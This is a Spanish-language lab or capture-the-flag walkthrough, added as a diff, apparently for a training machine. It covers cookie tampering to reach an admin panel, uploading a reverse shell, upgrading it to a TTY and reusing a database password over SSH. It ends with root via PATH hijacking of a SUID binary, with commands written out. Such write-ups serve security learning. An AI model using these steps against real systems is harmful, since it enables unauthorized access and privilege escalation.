@@ -1,0 +1,90 @@
+Mapeas con burpsuite, debes usar un proxy, yo uso foxyproxy, desde firefox  igual se puede
+
+despues de mapear, sale un login 
+
+
+http://10.129.89.154/cdn-cgi/login/admin.php?content=accounts&id=1
+
+se cambia la cookie para enumerar el contenido o el usuario de la pagina, para ver si hay admin, logineamos como guest
+
+se tiene que hacer desde tu sesion, no desde afuera, despues podemos simplemente subir una reverse shell y ejecuutarla donde esta su path que seria en uploads/reverse-shell
+
+https://github.com/BlackArch/webshells.git
+
+
+
+
+-------------------------------------------
+UPGRADE DE SHELL (reverse shell dumb → TTY)
+-------------------------------------------
+1. python3 -c 'import pty;pty.spawn("/bin/bash")'
+2. Ctrl+Z
+3. stty raw -echo; fg
+4. export TERM=xterm
+   export SHELL=bash
+ 
+Por qué funciona:
+- pty.spawn crea una pseudo-terminal
+- stty raw pasa caracteres directo (flechas, Ctrl+C, etc.)
+- -echo evita que se duplique lo que escribes
+- fg regresa la conexión al frente
+ 
+De la shell obtienes de la db.php una contraseña que esta asociada con robert, como esta ssh abilitado entras.
+
+export TERM=xterm
+
+lees la flag de robert 
+
+ves tus id para escalar privilegios, de ahi hay un bugtracker
+con:
+
+find / -group bugtracker
+
+ves donde hay bugtracker
+
+en el cual esta en /bin/ 
+
+
+para despues hacer un file, y listar, si lo ejecutas veras que curiosamente hace un cat, sin destino, porque marca error.
+entonces aprovechando eso se hace un directorio o archivo temporal en /tmp con el nombre cat, con el contenido ""/bin/sh/"
+
+echo “/bin/sh” > cat
+
+y haces un export path de la ruta tmp
+ejecutas y automaticamente te lanza una shell sh, en el cual ya eres root 
+
+whoami
+root
+
+ojo, como cat no se puede usar para leer se usa head
+
+y obtienes la flag de root :DDDDD
+
+
+!PWNED!
+
+- espera lo inesperado
+
+-------------------------------------------
+PATH CORRUPTO (fix rápido)
+-------------------------------------------
+  export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+ 
+-------------------------------------------
+PATH HIJACKING (escalada de privilegios)
+-------------------------------------------
+Si un binario SUID llama a un comando sin ruta absoluta (ej: "cat"):
+1. Creas un archivo malicioso en /tmp con ese nombre:
+     echo '/bin/bash' > /tmp/cat
+     chmod +x /tmp/cat
+2. Pones /tmp primero en el PATH:
+     export PATH=/tmp:$PATH
+3. Ejecutas el binario SUID → llama a TU cat → shell root
+ 
+Nota: si el cat falso no lee archivos, usa /bin/cat para leer flags.
+
+tal es el caso de esta 
+
+
+
+
